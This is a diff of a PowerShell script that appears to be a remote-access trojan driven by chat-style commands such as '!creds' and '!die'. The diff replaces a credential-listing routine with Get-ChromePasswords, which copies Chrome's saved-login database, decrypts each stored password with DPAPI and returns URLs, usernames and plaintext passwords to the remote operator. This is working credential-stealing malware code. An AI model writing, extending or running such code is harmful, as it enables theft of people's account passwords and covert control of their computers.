@@ -20,36 +20,52 @@ function Connect-ZiPo {
         return "[DOWNLOADED] $out"
     }
 
-    function Get-Credentials {
+    function Get-ChromePasswords {
     try {
-        $output = ""
-
-        # 1. Windows Credential Manager (generic credentials)
-        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
-            $target = $_.ToString().Split(":")[1].Trim()
-            $output += "`n[TARGET] $target"
-        }
-
-        # 2. Chrome saved logins (мета-данные — без дешифровки)
         $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeLoginPath) {
-            $output += "`n[+] Chrome login database found: $chromeLoginPath"
+        $tempDb = "$env:TEMP\chrome_login_temp.db"
+
+        if (-not (Test-Path $chromeLoginPath)) {
+            return "[ERROR] Chrome login database not found"
         }
 
-        # 3. Firefox профили (только список профилей)
-        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
-        foreach ($profile in $firefoxProfiles) {
-            $output += "`n[+] Firefox profile: $($profile.FullName)"
+        Copy-Item $chromeLoginPath $tempDb -Force
+
+        # Загружаем SQLite assembly
+        Add-Type -AssemblyName System.Data
+
+        $connectionString = "Data Source=$tempDb;Version=3;"
+        $conn = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+        $conn.Open()
+
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+        $reader = $cmd.ExecuteReader()
+
+        $results = ""
+
+        while ($reader.Read()) {
+            $url = $reader["origin_url"]
+            $user = $reader["username_value"]
+            $passBytes = $reader["password_value"]
+
+            # Расшифровка пароля с использованием DPAPI
+            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                $passBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+            )
+            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+
+            $results += "`n[URL] $url`n[USER] $user`n[PASS] $password`n"
         }
 
-        if ([string]::IsNullOrWhiteSpace($output)) {
-            return "[INFO] No credentials found or access denied."
-        }
+        $reader.Close()
+        $conn.Close()
+        Remove-Item $tempDb -Force
 
-        return $output
+        return $results
     }
     catch {
-        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
+        return "[ERROR] Failed to extract Chrome passwords: $($_.Exception.Message)"
     }
 }
     
@@ -224,7 +240,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-Credentials
+                        $response = Get-ChromePasswords
                     }
                     elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
